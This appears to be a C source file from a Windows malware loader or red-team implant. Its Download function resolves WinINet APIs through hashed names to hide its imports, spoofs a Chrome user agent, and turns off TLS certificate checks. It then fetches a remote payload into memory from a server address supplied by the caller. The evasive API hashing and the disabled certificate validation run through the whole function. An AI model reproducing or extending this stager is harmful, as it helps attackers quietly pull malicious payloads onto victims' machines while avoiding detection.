#include <Windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

#include "include/common.h"

#define InternetOpenA_JOAA      0x154BE30F
#define InternetConnectA_JOAA   0x51CC39CF
#define HttpOpenRequestA_JOAA   0x03084192
#define InternetSetOptionA_JOAA         0xD8C64F22
#define HttpSendRequestA_JOAA   0xA14CFDA5
#define InternetReadFile_JOAA   0xF1FF9642
#define InternetCloseHandle_JOAA        0x9E679473
#define GetTickCount64_JOAA     0x00BB616E
#define LoadLibraryA_JOAA	0x54C1D227
#define KERNEL32DLL_JOAA        0xFD2AD9BD
#define WININETDLL_JOAA         0x668CA1EC


API_HASHING g_Api = { 0 };

DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
{
	HANDLE kernerl32_handle = GetModuleHandleH(KERNEL32DLL_JOAA);
	g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernerl32_handle, LoadLibraryA_JOAA);

	HANDLE wininet_handle = g_Api.pLoadLibraryA("wininet.dll");
	
	g_Api.pInternetOpenA = (fnInternetOpenA)GetProcAddressH(wininet_handle, InternetOpenA_JOAA);
	g_Api.pInternetConnectA = (fnInternetConnectA)GetProcAddressH(wininet_handle, InternetConnectA_JOAA);
	g_Api.pHttpOpenRequestA = (fnHttpOpenRequestA)GetProcAddressH(wininet_handle, HttpOpenRequestA_JOAA);
	g_Api.pInternetSetOptionA = (fnInternetSetOptionA)GetProcAddressH(wininet_handle, InternetSetOptionA_JOAA);
	g_Api.pHttpSendRequestA = (fnHttpSendRequestA)GetProcAddressH(wininet_handle, HttpSendRequestA_JOAA);
	g_Api.pInternetReadFile = (fnInternetReadFile)GetProcAddressH(wininet_handle, InternetReadFile_JOAA);
	g_Api.pInternetCloseHandle = (fnInternetCloseHandle)GetProcAddressH(wininet_handle, InternetCloseHandle_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);


	if (g_Api.pGetTickCount64 == NULL) printf("GetTickCount64\n");
	if (g_Api.pInternetOpenA == NULL) printf("InternetOpenA\n");
	if (g_Api.pInternetConnectA == NULL) printf("InternetConnectA\n");
	if (g_Api.pHttpOpenRequestA == NULL) printf("HttpOpenRequestA\n");
	if (g_Api.pInternetSetOptionA == NULL) printf("InternetSetOptionA\n");
	if (g_Api.pHttpSendRequestA == NULL) printf("HttpSendRequestA\n");
	if (g_Api.pInternetReadFile == NULL) printf("InternetReadFile\n");
	if (g_Api.pInternetCloseHandle == NULL) printf("InternetCloseHandle\n");


	DWORD bytesRead = 0;
	DWORD totalBytesRead = 0;
	const DWORD bufferSize = 1024;
	char buffer[1024];

	HINTERNET hInternet = g_Api.pInternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL)
		return -1;

	// connect to remote server
	HINTERNET hConnect = NULL;
	if(ssl)
		hConnect = g_Api.pInternetConnectA(hInternet, url, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);
	else
		hConnect = g_Api.pInternetConnectA(hInternet, url, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)NULL);

	if (hConnect == NULL)
	{
		g_Api.pInternetCloseHandle(hInternet);
		return -1;
	}

	HINTERNET hRequest = NULL;
	if(ssl)
		hRequest = g_Api.pHttpOpenRequestA(hConnect, "GET", endpoint , NULL, NULL, NULL, (INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE), 0);
	else
		hRequest = g_Api.pHttpOpenRequestA(hConnect, "GET", endpoint, NULL, NULL, NULL, (INTERNET_FLAG_DONT_CACHE), 0);

	DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

	g_Api.pInternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS,&flags,sizeof(flags));

	BOOL status = g_Api.pHttpSendRequestA(hRequest,NULL,0,NULL,0);

	DWORD dwBytesRead = NULL;
	SIZE_T sSize = 0;

	*response = (char*)malloc(1);
	do {
		if (g_Api.pInternetReadFile(hRequest, buffer, bufferSize, &bytesRead)) {
			if (bytesRead > 0) {
				char* temp = (char*)realloc(*response, totalBytesRead + bytesRead + 1);
				if (temp == NULL) {
					return NULL;
				}
				else {
					*response = temp;
					memcpy(*response + totalBytesRead, buffer, bytesRead);
					totalBytesRead += bytesRead;
					(*response)[totalBytesRead] = '\0';
				}
			}
		}
	} while (bytesRead > 0);

	g_Api.pInternetCloseHandle(hInternet);
	g_Api.pInternetCloseHandle(hRequest);
	return totalBytesRead;
}